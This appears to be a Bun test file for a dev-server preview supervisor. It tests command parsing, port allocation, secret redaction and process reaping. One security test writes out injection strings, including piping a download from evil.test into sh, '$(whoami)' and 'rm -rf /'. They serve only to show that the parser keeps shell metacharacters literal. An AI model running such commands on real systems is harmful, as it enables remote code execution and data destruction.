import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { config } from "../src/config.ts";
import { resetNotices, notices } from "../src/notices.ts";
import {
  _resetPreviewsForTest, expandPlaceholders, getPreview, isPreviewing, parsePreviewCommand,
  parseStarttime, pickPort, previewCommand, reapOrphans, redactCommand, resolvePreview,
  startPreview, stopPreview, sweepOncePreviews,
} from "../src/preview.ts";
import type { Project, Task } from "../src/types.ts";

const FIXTURE = join(import.meta.dir, "fixtures", "fake-dev-server.ts");

// ─────────────────────────────────────────────────────────────────────────────
// Pure
// ─────────────────────────────────────────────────────────────────────────────

describe("parsePreviewCommand", () => {
  test("splits a string on whitespace", () => {
    expect(parsePreviewCommand("pnpm dev --port {port}")).toEqual({
      env: {}, argv: ["pnpm", "dev", "--port", "{port}"],
    });
  });

  test("leading NAME=VALUE tokens become child env", () => {
    expect(parsePreviewCommand("PORT=3000 HOST=127.0.0.1 npm start")).toEqual({
      env: { PORT: "3000", HOST: "127.0.0.1" }, argv: ["npm", "start"],
    });
  });

  test("an assignment AFTER the program is an argument, not env", () => {
    const { env, argv } = parsePreviewCommand("npm start FOO=bar");
    expect(env).toEqual({});
    expect(argv).toEqual(["npm", "start", "FOO=bar"]);
  });

  // The array form is the whole reason it exists: whitespace-splitting a string
  // would turn this into four arguments and the dev server would print usage.
  test("the array form preserves an argument containing spaces", () => {
    const { argv } = parsePreviewCommand(["pnpm", "dev", "--define", "API=https://x.test/a b"]);
    expect(argv).toEqual(["pnpm", "dev", "--define", "API=https://x.test/a b"]);
  });

  test("env assignments are honoured in the array form too", () => {
    expect(parsePreviewCommand(["PORT=1", "npm", "start"])).toEqual({
      env: { PORT: "1" }, argv: ["npm", "start"],
    });
  });

  // SECURITY, not parsing: there is no `sh -c`, so shell metacharacters must reach
  // the child as literal argv entries. If this ever starts interpreting them, a
  // projects.json typo becomes a command-injection surface.
  test("shell metacharacters stay literal argv tokens", () => {
    const { argv } = parsePreviewCommand("npm run dev && curl evil.test | sh");
    expect(argv).toEqual(["npm", "run", "dev", "&&", "curl", "evil.test", "|", "sh"]);
    expect(parsePreviewCommand("npm run $(whoami)").argv).toContain("$(whoami)");
    // `;` stays glued to the token it was typed against — proof it was never
    // treated as a statement separator.
    expect(parsePreviewCommand("npm run dev; rm -rf /").argv).toEqual(["npm", "run", "dev;", "rm", "-rf", "/"]);
  });

  test("blank input yields no program", () => {
    expect(parsePreviewCommand("   ").argv).toEqual([]);
    expect(parsePreviewCommand([]).argv).toEqual([]);
  });
});

describe("expandPlaceholders", () => {
  test("substitutes {port} in argv and in env values", () => {
    expect(expandPlaceholders(["--port", "{port}"], { port: 8788 })).toEqual(["--port", "8788"]);
    expect(expandPlaceholders({ PORT: "{port}" }, { port: 8788 })).toEqual({ PORT: "8788" });
  });

  test("substitutes every occurrence, including inside a larger string", () => {
    expect(expandPlaceholders(["http://127.0.0.1:{port}/{port}"], { port: 90 })).toEqual(["http://127.0.0.1:90/90"]);
  });

  test("leaves unknown placeholders alone", () => {
    expect(expandPlaceholders(["--base", "{base}"], { port: 1 })).toEqual(["--base", "{base}"]);
  });
});

describe("pickPort", () => {
  const free = () => true;

  test("returns the first port that is neither reserved nor bound", () => {
    expect(pickPort([8788, 8789], new Set(), free)).toBe(8788);
    expect(pickPort([8788, 8789], new Set([8788]), free)).toBe(8789);
  });

  test("skips ports the probe says are busy", () => {
    expect(pickPort([8788, 8789], new Set(), (p) => p !== 8788)).toBe(8789);
  });

  test("null when the pool is exhausted", () => {
    expect(pickPort([8788], new Set([8788]), free)).toBeNull();
    expect(pickPort([8788, 8789], new Set(), () => false)).toBeNull();
    expect(pickPort([], new Set(), free)).toBeNull();
  });

  test("never returns a port outside the pool", () => {
    for (const taken of [new Set<number>(), new Set([8788])]) {
      const p = pickPort([8788, 8789], taken, free);
      if (p !== null) expect([8788, 8789]).toContain(p);
    }
  });
});

// Field 22 is NOT split(" ")[21]. Field 2 is `comm` in parens and may itself
// contain spaces and parens. A wrong parse either never reaps (a port leak) or —
// worse — matches wrongly and SIGKILLs an unrelated process.
describe("parseStarttime", () => {
  // Fields 3..21 then starttime at 22. Once "pid (comm)" is consumed, index 0 is
  // field 3, so starttime lands at index 19: state,ppid,pgrp,session,tty,tpgid,flags
  // (7 tokens, indices 0-6) then 12 filler fields (7-18), then starttime (19).
  const stat = (comm: string) =>
    `1234 (${comm}) S 1 1234 1234 0 -1 4194304 ` + Array.from({ length: 12 }, (_, i) => i).join(" ") + " 987654 " + "0 ".repeat(30);

  test("reads field 22 for an ordinary comm", () => {
    expect(parseStarttime(stat("node"))).toBe(987654);
  });

  test("survives a comm containing spaces and parentheses", () => {
    expect(parseStarttime(stat("my app (dev)"))).toBe(987654);
    expect(parseStarttime(stat("weird ) name"))).toBe(987654);
  });

  test("null on junk rather than a wrong number", () => {
    expect(parseStarttime("")).toBeNull();
    expect(parseStarttime("no parens here")).toBeNull();
    expect(parseStarttime("1234 (node) S")).toBeNull();
  });

  // Proves the parse against the real format rather than only our fixture.
  test("agrees with this process's own /proc entry", () => {
    if (!existsSync(`/proc/${process.pid}/stat`)) return; // not Linux
    const v = parseStarttime(readFileSync(`/proc/${process.pid}/stat`, "utf8"));
    expect(typeof v).toBe("number");
    expect(v).toBeGreaterThan(0);
  });
});

// The GET that serves this is UNGATED, and a denylist of TOKEN|SECRET|KEY|PASS
// misses DATABASE_URL, SENTRY_DSN, STRIPE_SK and npm_config__auth.
describe("redactCommand", () => {
  test("shows env names but never their values", () => {
    const out = redactCommand(["pnpm", "dev"], { API_KEY: "sk-live-abcdef", DATABASE_URL: "postgres://u:pw@h/db" });
    expect(out).toContain("API_KEY=[set]");
    expect(out).toContain("DATABASE_URL=[set]");
    expect(out).not.toContain("sk-live-abcdef");
    expect(out).not.toContain("postgres://u:pw@h/db");
  });

  test("keeps the program and its flags legible", () => {
    expect(redactCommand(["pnpm", "dev", "--port", "8788"], {})).toBe("pnpm dev --port 8788");
  });

  test("scrubs daemon secrets that leaked into argv", () => {
    expect(redactCommand(["x", `--u=http://h/hooks?token=${config.hookToken}`], {})).not.toContain(config.hookToken);
  });
});

describe("resolvePreview", () => {
  const base: Project = { id: "shop", path: "/srv/shop", label: "shop" };

  test("a configured command resolves", () => {
    const r = resolvePreview({ ...base, preview: "pnpm dev", install: "pnpm i" });
    expect(r).toEqual({ ok: true, preview: "pnpm dev", install: "pnpm i" });
  });

  // Never a silent failure: the reason IS the fix, ready to paste.
  test("no command explains what to add, with the project's real id and path", () => {
    const r = resolvePreview(base);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toContain("projects.json");
    expect(r.reason).toContain('"id": "shop"');
    expect(r.reason).toContain('"path": "/srv/shop"');
    expect(r.reason).toContain("{port}");
  });

  test("an unknown project is refused rather than guessed at", () => {
    expect(resolvePreview(undefined).ok).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Lifecycle — real processes, against the fixture
// ─────────────────────────────────────────────────────────────────────────────

describe("the supervisor", () => {
  let wt: string;
  let savedPorts: number[];
  let savedReady: number;
  let savedTtl: number;

  const project = (over: Partial<Project> = {}): Project => ({ id: "p", path: wt, label: "p", ...over });
  const task = (id = "t_pv"): Task => ({
    id, project: "p", title: "t", prompt: "p", branch: "b", worktree: wt,
    tmux: null, sessionId: null, status: "done", phase: "done", pendingQuestion: null,
    lastActivity: Date.now(), createdAt: Date.now(), error: null,
    planReviews: { ceo: null, design: null, eng: null },
    pipeline: false, step: 0, stepSkillSeen: false, pipelineMissed: 0,
  });
  /** The fixture, as a preview command. `bun <fixture>` is argv, so it also proves
   *  the no-shell path handles a real program. */
  const fixtureCmd = (...extra: string[]) => ["bun", FIXTURE, ...extra];

  beforeEach(() => {
    wt = mkdtempSync(join(tmpdir(), "agentdeck-pv-wt-"));
    // A populated node_modules by default, so the install branch is opt-in per test.
    mkdirSync(join(wt, "node_modules"), { recursive: true });
    savedPorts = config.preview.ports;
    savedReady = config.preview.readyTimeoutMs;
    savedTtl = config.preview.ttlMs;
    // Ports well clear of the documented default so a developer running the daemon
    // while the suite runs doesn't collide with their own previews.
    config.preview.ports = [18788, 18789];
    config.preview.readyTimeoutMs = 8_000;
    resetNotices();
  });

  afterEach(async () => {
    for (const id of ["t_pv", "t_pv2", "t_pv3"]) await stopPreview(id).catch(() => {});
    _resetPreviewsForTest();
    config.preview.ports = savedPorts;
    config.preview.readyTimeoutMs = savedReady;
    config.preview.ttlMs = savedTtl;
    rmSync(wt, { recursive: true, force: true });
  });

  test("a listening command reaches ready and takes a pool port", async () => {
    const st = await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
    expect(st.status).toBe("ready");
    expect(config.preview.ports).toContain(st.port);
    expect(isPreviewing("t_pv")).toBe(true);
    expect(previewCommand("t_pv")).toContain("fake-dev-server");
  });

  // Fast, not after the readiness timeout: the operator should not wait 60s to be
  // told the thing died in 50ms.
  test("a command that exits immediately fails fast, carrying its stderr", async () => {
    config.preview.readyTimeoutMs = 30_000; // would dominate if we waited for it
    const started = Date.now();
    await expect(
      startPreview(task(), project({ preview: fixtureCmd("--stderr", "boom-cannot-find-module", "--exit", "1") })),
    ).rejects.toThrow(/boom-cannot-find-module/);
    expect(Date.now() - started).toBeLessThan(10_000);
    expect(getPreview("t_pv")?.status).toBe("failed");
    expect(getPreview("t_pv")?.error).toContain("boom-cannot-find-module");
  });

  test("a command that never listens fails on the readiness timeout", async () => {
    config.preview.readyTimeoutMs = 1_200;
    await expect(
      startPreview(task(), project({ preview: fixtureCmd() })),
    ).rejects.toThrow(/did not listen/);
    expect(getPreview("t_pv")?.status).toBe("failed");
  });

  // THE DEADLOCK TEST. spawnOpts pipes stdout; a dev server writes its banner and
  // every rebuild there. An undrained pipe blocks the child at 64KiB and the
  // symptom is not an error — the preview simply never becomes ready.
  test("a child that floods stdout still reaches ready", async () => {
    const st = await startPreview(task(), project({ preview: fixtureCmd("--flood", "400000", "--port", "{port}") }));
    expect(st.status).toBe("ready");
  });

  // THE GRANDCHILD TEST. `npm run dev` is a wrapper that forks the real server and
  // waits; child.kill() reaps only the wrapper and leaves the port held.
  test("stopping reaps the whole process group and frees the port", async () => {
    const cmd = ["sh", "-c", `bun ${FIXTURE} --port {port} & wait`];
    const st = await startPreview(task(), project({ preview: cmd }));
    expect(st.status).toBe("ready");
    const port = st.port;

    await stopPreview("t_pv");
    expect(isPreviewing("t_pv")).toBe(false);

    // The port is genuinely free again — the assertion the wrapper would fail.
    const probe = Bun.listen({ hostname: "127.0.0.1", port, socket: { data() {} } });
    probe.stop(true);
    // And nothing from the fixture survives.
    const alive = spawnSync("pgrep", ["-f", `${FIXTURE} --port ${port}`], { encoding: "utf8" });
    expect(alive.stdout.trim()).toBe("");
  });

  test("two rapid starts yield one child, not a race for the port", async () => {
    const p = project({ preview: fixtureCmd("--delay", "300", "--port", "{port}") });
    const [a, b] = await Promise.all([startPreview(task(), p), startPreview(task(), p)]);
    expect(a.port).toBe(b.port);
    expect(a.startedAt).toBe(b.startedAt); // same entry, not two
  });

  test("starting an already-ready preview returns the same entry", async () => {
    const p = project({ preview: fixtureCmd("--port", "{port}") });
    const first = await startPreview(task(), p);
    const again = await startPreview(task(), p);
    expect(again.port).toBe(first.port);
    expect(again.startedAt).toBe(first.startedAt);
  });

  test("pool exhaustion names the running previews", async () => {
    config.preview.ports = [18790]; // one slot
    const p = project({ preview: fixtureCmd("--port", "{port}") });
    await startPreview(task("t_pv"), p);
    await expect(startPreview(task("t_pv2"), p)).rejects.toThrow(/t_pv/);
    await expect(startPreview(task("t_pv2"), p)).rejects.toThrow(/stop one first/);
  });

  test("an unconfigured project explains what to add instead of failing silently", async () => {
    await expect(startPreview(task(), project())).rejects.toThrow(/projects\.json/);
    expect(isPreviewing("t_pv")).toBe(false); // no port burned on a config error
  });

  describe("node_modules", () => {
    beforeEach(() => rmSync(join(wt, "node_modules"), { recursive: true, force: true }));

    // The normal state of a fresh worktree: `git worktree add` carries tracked
    // files only, and node_modules is gitignored.
    test("absent with no install command names the exact command to run", async () => {
      await expect(
        startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") })),
      ).rejects.toThrow(/no node_modules/);
      const e = getPreview("t_pv");
      expect(e?.error).toContain("npm install");
      expect(e?.error).toContain(wt);
    });

    test("absent with an install command runs it first, then starts", async () => {
      const p = project({
        install: ["sh", "-c", `mkdir -p ${join(wt, "node_modules")}`],
        preview: fixtureCmd("--port", "{port}"),
      });
      const st = await startPreview(task(), p);
      expect(st.status).toBe("ready");
      expect(existsSync(join(wt, "node_modules"))).toBe(true);
    });

    test("a failing install reports its exit code and output", async () => {
      const p = project({
        install: ["sh", "-c", "echo lockfile-mismatch >&2; exit 3"],
        preview: fixtureCmd("--port", "{port}"),
      });
      await expect(startPreview(task(), p)).rejects.toThrow(/install failed \(exit 3\)/);
      expect(getPreview("t_pv")?.error).toContain("lockfile-mismatch");
    });

    test("an install that hangs is killed at the timeout", async () => {
      config.preview.installTimeoutMs = 800;
      const p = project({ install: ["sh", "-c", "sleep 60"], preview: fixtureCmd("--port", "{port}") });
      await expect(startPreview(task(), p)).rejects.toThrow(/install timed out/);
      config.preview.installTimeoutMs = 600_000;
    });
  });

  describe("the sweep", () => {
    test("a preview past its TTL is stopped", async () => {
      config.preview.ttlMs = 50;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await new Promise((r) => setTimeout(r, 80));
      await sweepOncePreviews();
      expect(isPreviewing("t_pv")).toBe(false);
    });

    test("ttlMs = 0 disables the cap entirely", async () => {
      config.preview.ttlMs = 0;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await sweepOncePreviews(Date.now() + 10 * 24 * 60 * 60_000); // ten days on
      expect(isPreviewing("t_pv")).toBe(true);
    });

    test("a healthy preview is left alone", async () => {
      config.preview.ttlMs = 60_000;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await sweepOncePreviews();
      expect(getPreview("t_pv")?.status).toBe("ready");
    });

    // A dev server that dies on its own must show on the board rather than sitting
    // at `ready` while the operator's tab fails to connect.
    test("a dev server that died is marked failed by the health check", async () => {
      const cmd = ["sh", "-c", `bun ${FIXTURE} --port {port} & wait`];
      const st = await startPreview(task(), project({ preview: cmd }));
      spawnSync("pkill", ["-f", `${FIXTURE} --port ${st.port}`]);
      await new Promise((r) => setTimeout(r, 300));
      await sweepOncePreviews();
      expect(getPreview("t_pv")?.status).toBe("failed");
    });
  });

  describe("reapOrphans", () => {
    const pidfile = () => join(config.dataDir, "previews.json");
    const write = (records: unknown) => writeFileSync(pidfile(), JSON.stringify(records));

    afterEach(() => { try { rmSync(pidfile()); } catch { /* fine */ } });

    test("no pidfile is a no-op", async () => {
      try { rmSync(pidfile()); } catch { /* fine */ }
      expect(await reapOrphans()).toBe(0);
    });

    test("a malformed pidfile is ignored rather than thrown on", async () => {
      writeFileSync(pidfile(), "{not json");
      expect(await reapOrphans()).toBe(0);
      write({ notAn: "array" });
      expect(await reapOrphans()).toBe(0);
    });

    // THE PID-REUSE SAFETY TEST. A recorded pid is not an identity; killing a
    // recycled one is strictly worse than the port leak being fixed.
    test("a starttime mismatch means the pid was recycled — nothing is killed", async () => {
      const victim = spawnSync("sh", ["-c", "echo $$"], { encoding: "utf8" });
      expect(victim.status).toBe(0);
      // Our own pid, with a deliberately wrong starttime.
      write([{ taskId: "t_gone", pid: process.pid, port: 18999, startedAt: Date.now(), starttime: 1 }]);
      expect(await reapOrphans()).toBe(0); // and this process is, evidently, still alive
    });

    test("a matching starttime is reaped", async () => {
      // detached:true is what the supervisor uses, and it is load-bearing here:
      // killGroup is kill(-pid), which only addresses the child's group because
      // being detached makes it a group LEADER (pid === pgid). A plain background
      // job would sit in the shell's group and kill(-pid) would find nothing.
      const child = spawn("sleep", ["30"], { detached: true, stdio: "ignore" });
      child.unref();
      const pid = child.pid!;
      const stat = readFileSync(`/proc/${pid}/stat`, "utf8");
      write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: parseStarttime(stat) }]);
      expect(await reapOrphans()).toBe(1);
      await new Promise((r) => setTimeout(r, 200));
      expect(spawnSync("kill", ["-0", String(pid)]).status).not.toBe(0);
    });

    test("a dead pid whose port is still held raises a notice rather than dropping quietly", async () => {
      // The wrapper died; the real server survived and still holds the port.
      const holder = Bun.listen({ hostname: "127.0.0.1", port: 18999, socket: { data() {} } });
      try {
        write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
        expect(await reapOrphans()).toBe(0);
        expect(notices().some((n) => n.code === "preview-orphan" && n.message.includes("18999"))).toBe(true);
      } finally {
        holder.stop(true);
      }
    });

    test("a dead pid whose port is free drops silently", async () => {
      write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
      expect(await reapOrphans()).toBe(0);
      expect(notices().some((n) => n.code === "preview-orphan")).toBe(false);
    });

    test("the pidfile is consumed, so a second boot does not re-reap", async () => {
      write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
      await reapOrphans();
      expect(existsSync(pidfile())).toBe(false);
    });
  });
});
